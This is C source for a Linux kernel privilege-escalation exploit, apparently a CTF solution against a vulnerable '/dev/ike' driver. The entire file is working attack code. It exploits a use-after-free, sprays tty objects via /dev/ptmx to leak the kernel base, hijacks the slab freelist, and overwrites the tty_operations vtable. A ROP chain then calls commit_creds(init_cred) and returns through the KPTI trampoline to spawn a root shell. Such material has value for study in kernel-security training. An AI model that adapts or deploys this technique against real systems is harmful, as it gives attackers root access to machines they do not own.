#define _GNU_SOURCE               
#include <stdio.h>                         
#include <stdlib.h>                                                                   
#include <sys/types.h>          
#include <sys/stat.h>              
#include <fcntl.h>
#include <sched.h>                         
#include <sys/mman.h>                
#include <signal.h> 
#include <sys/syscall.h>
#include <sys/ioctl.h>                    
#include <sys/wait.h>                      
#include <poll.h>                                                                     
#include <unistd.h>                      
#include <stdlib.h>          
#include <pthread.h>
#include <string.h>                        
#include <sys/ipc.h>                       
#include <sys/msg.h>

#define DEVICE_NAME "/dev/ike"
#define ATTCK_OBJ   "/dev/ptmx"
#define CMD_ALLOC   0x13370002
#define CMD_FREE    0x13370004
#define CMD_READ    0x13370006
#define CMD_WRITE   0x13370008
#define MAX_SIZE    0x320
#define SPRAY_WIDTH 50

#define prepare_kernel_cred (kbase + 0x0c1f30)
#define commit_creds (kbase + 0x0c1ca0)
#define init_cred (kbase + 0x1a52bc0)
#define kpti_trampoline (kbase + 0x1001637) // 0xffffffff8200163a
#define push_rdx_stuff_pop_rsp (kbase + 0xb6a88a) // 0xffffffff81b6a88a
#define pop_rdi (kbase + 0x084504)
#define iretq (kbase + 0xb2394a)
#define ret (kbase + 0x1d5f25)

int fd[4];
int tty_fd[SPRAY_WIDTH];
char buffer[MAX_SIZE];

unsigned long kbase;
unsigned long tty_slot;
long _proc_cs, _proc_ss, _proc_rsp, _proc_rflags;

typedef struct {
  int W_PERM;
  int R_PERM;
  char data[MAX_SIZE];
} kheap_obj_t;

typedef struct {
  char *ptr;
  size_t size;
} request_t;

void _pause(const char *msg) {
    printf("[*] pause: %s\n", msg);
    getchar();
}

void _error(const char *msg) {
    printf("[!] error: ");
    perror(msg);
    exit(-1);
}

void save_state() {
    asm volatile(
        ".intel_syntax noprefix;"
        "mov _proc_cs, cs;"
        "mov _proc_ss, ss;"
        "mov _proc_rsp, rsp;"
        "pushf;"
        "pop _proc_rflags;"
        ".att_syntax"
        );

    printf("[+] CS: 0x%lx, SS: 0x%lx, RSP: 0x%lx, RFLAGS: 0x%lx\n", _proc_cs, _proc_ss, _proc_rsp, _proc_rflags);
}               

void spawn_shell() {
    puts("[+] Hello Userland!");
    int uid = getuid();
    if (uid == 0)
        printf("[+] UID: %d (root poggers)\n", uid);
    else {
        printf("[!] UID: %d (epic fail)\n", uid);
    }

    puts("[*] starting shell");
    system("/bin/sh");

    puts("[*] quitting exploit");
    exit(0); // avoid ugly segfault
}

void ioctl_alloc(int fd) {
    request_t req = {
        .ptr = (void*)0x0,
        .size = 0x0
    };

    if (ioctl(fd, CMD_ALLOC, &req) < 0) {
        _error("ioctl_alloc");
    }
}

void ioctl_free(int fd) {
    request_t req = {
        .ptr = (void*)0x0,
        .size = 0x0,
    };

    if (ioctl(fd, CMD_FREE, &req) < 0) {
        _error("ioctl_free");
    }
}

void ioctl_read(int fd, char *buf, size_t size) {
    if (size > MAX_SIZE) {
        _error("ioctl_read: size");
    }

    request_t req = {
        .ptr = buf,
        .size = size
    };

    if (ioctl(fd, CMD_READ, &req) < 0) {
        _error("ioctl_read");
    }
}

void ioctl_write(int fd, char *buf, size_t size) {
    if (size > MAX_SIZE) {
        _error("ioctl_write: size");
    }

    request_t req = {
        .ptr = buf,
        .size = size
    };

    if (ioctl(fd, CMD_WRITE, &req) < 0) {
        _error("ioctl_write");
    }
}

int main(int argc, char *argv[]){
    setvbuf(stdout, NULL, _IONBF, 0);
    save_state();
    signal(SIGSEGV, spawn_shell);

    fd[1] = open(DEVICE_NAME, O_RDWR);
    fd[0] = open(DEVICE_NAME, O_RDWR);
    if (fd[0] < 0 || fd[1] < 0) {
        _error("open");
    }
    printf("[+] device opened: %d\n", fd[0]);

    ioctl_alloc(fd[0]);
    ioctl_free(fd[0]);

    for(int i = 0; i < SPRAY_WIDTH; i++) {
        tty_fd[i] = open(ATTCK_OBJ, O_RDWR | O_NOCTTY);
        if (tty_fd[i] < 0) {
            _error("open");
        }
    }
    ioctl_read(fd[0], buffer, MAX_SIZE);

    tty_slot = ((unsigned long *)buffer)[7] - 0x40;
    kbase = ((unsigned long *)buffer)[3] - 0x12899e0;
    printf("[+] tty_slot: %#lx\n", tty_slot);
    printf("[+] kernel base: %#lx\n", kbase);

    close(fd[1]);
    memset(buffer, 0x0, MAX_SIZE);
    if (read(fd[0], buffer, MAX_SIZE) < 0) {
        _error("read");
    }

    unsigned long next = ((unsigned long *)buffer)[50];
    printf("[+] next: %#lx\n", next);

    puts("[*] hijacking freelist");
    ((unsigned long *)buffer)[50] = tty_slot;
    write(fd[0], buffer, MAX_SIZE);

    fd[2] = open(DEVICE_NAME, O_RDWR);
    fd[3] = open(DEVICE_NAME, O_RDWR);
    if (fd[2] < 0 || fd[3] < 0) {
        _error("open");
    }

    puts("[*] overwriting tty_operations vtable");
    memset(buffer, 0x0, MAX_SIZE);
    ((unsigned long *)buffer)[0] = 0x100005401;     // magic bytes
    ((unsigned long *)buffer)[2] = next+0x400;      // writable area
    ((unsigned long *)buffer)[3] = next+0x400;      // writable area
    ((unsigned long *)buffer)[4] = (tty_slot+(20*8));
    ((unsigned long *)buffer)[5] = next+0x400;      // writable area
    ((unsigned long *)buffer)[32] = push_rdx_stuff_pop_rsp;

    unsigned long *ptr = (unsigned long *)&buffer[40*8];
    *ptr++ = 0x4141414141414141;
    *ptr++ = 0x4242424242424242;
    *ptr++ = 0x4343434343434343;
    *ptr++ = pop_rdi;
    *ptr++ = init_cred;
    *ptr++ = commit_creds;
    *ptr++ = kpti_trampoline;
    *ptr++ = 0x0;
    *ptr++ = 0x0;
    *ptr++ = (unsigned long)spawn_shell;
    *ptr++ = _proc_cs;
    *ptr++ = _proc_rflags;
    *ptr++ = _proc_rsp;
    *ptr++ = _proc_ss;

    // unsigned long *ptr = (unsigned long *)&buffer[20*8];
    // for(int i = 0x0; i < MAX_SIZE/0x8; i++) {
    //     *ptr++ = 0xdeadc0dedead0000 + (i << 8);
    //     printf("[*] payload[%d]: %#lx\n", i, ((unsigned long *)buffer)[i]); // offset at 0x0b
    // }
    write(fd[3], buffer, MAX_SIZE);
    _pause("ops overwritten");

    for(int i = 0; i < SPRAY_WIDTH; i++) {
        ioctl(tty_fd[i], /*EBX ECX ESI*/ 0xdeadc0de, /*R8 RDX R12*/ tty_slot+(40*8));
    }

    _pause("end of exploit ...");
    return 0;
}